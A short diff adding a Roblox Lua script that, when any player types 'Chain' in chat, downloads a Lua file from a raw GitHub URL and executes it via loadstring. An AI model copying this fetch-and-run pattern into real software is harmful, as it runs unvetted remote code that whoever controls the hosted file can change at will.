@@ -1,0 +1,12 @@
+game.Players.PlayerAdded:Connect(
+    function(fans)
+        fans.Chatted:Connect(
+            function(msg)
+                if msg == "Chain" then
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sigmanic/ROBLOX/main/AutoChain.lua"))()
+                end
+            end
+        )
+    end
+)
+
